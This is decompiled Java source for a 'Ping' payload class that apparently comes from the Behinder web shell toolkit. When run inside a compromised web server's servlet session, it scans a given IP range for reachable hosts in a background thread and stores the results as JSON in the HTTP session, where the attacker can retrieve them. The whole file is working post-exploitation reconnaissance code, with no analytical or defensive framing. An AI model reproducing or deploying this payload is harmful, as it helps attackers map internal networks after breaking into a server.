// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.util.Iterator;
import java.util.Map;
import java.util.HashMap;
import java.math.BigInteger;
import java.net.UnknownHostException;
import java.net.InetAddress;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;
import javax.servlet.http.HttpSession;

public class Ping implements Runnable
{
    public static String ipList;
    public static String taskID;
    private HttpSession Session;
    
    public Ping() {
    }
    
    public Ping(final HttpSession session) {
        this.Session = session;
    }
    
    public void execute(final ServletRequest request, final ServletResponse response, final HttpSession session) throws Exception {
        new Thread(new Ping(session)).start();
    }
    
    private static int ip2int(final String ip) throws UnknownHostException {
        int result = 0;
        final InetAddress addr = InetAddress.getByName(ip);
        for (final byte b : addr.getAddress()) {
            result = (result << 8 | (b & 0xFF));
        }
        return result;
    }
    
    private static String int2ip(final int value) throws UnknownHostException {
        final byte[] bytes = BigInteger.valueOf(value).toByteArray();
        final InetAddress address = InetAddress.getByAddress(bytes);
        return address.getHostAddress();
    }
    
    public static void main(final String[] args) {
        final String start = Ping.ipList.split("-")[0];
        final String stop = Ping.ipList.split("-")[1];
        try {
            final int startValue = ip2int(start);
            final int stopValue = ip2int(stop);
            for (int i = ip2int(start); i < ip2int(stop); ++i) {
                final String ip = int2ip(i);
                InetAddress.getByName(ip).isReachable(3000);
            }
        }
        catch (Exception ex) {}
    }
    
    @Override
    public void run() {
        final String start = Ping.ipList.split("-")[0];
        final String stop = Ping.ipList.split("-")[1];
        final Map<String, String> sessionObj = new HashMap<String, String>();
        final Map<String, String> scanResult = new HashMap<String, String>();
        sessionObj.put("running", "true");
        try {
            final int startValue = ip2int(start);
            for (int stopValue = ip2int(stop), i = startValue; i <= stopValue; ++i) {
                final String ip = int2ip(i);
                final boolean isAlive = InetAddress.getByName(ip).isReachable(3000);
                if (isAlive) {
                    scanResult.put(ip, "true");
                    sessionObj.put("result", this.buildJson(scanResult, false));
                }
                this.Session.setAttribute(Ping.taskID, (Object)sessionObj);
            }
        }
        catch (Exception e) {
            sessionObj.put("result", e.getMessage());
        }
        sessionObj.put("running", "false");
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
}
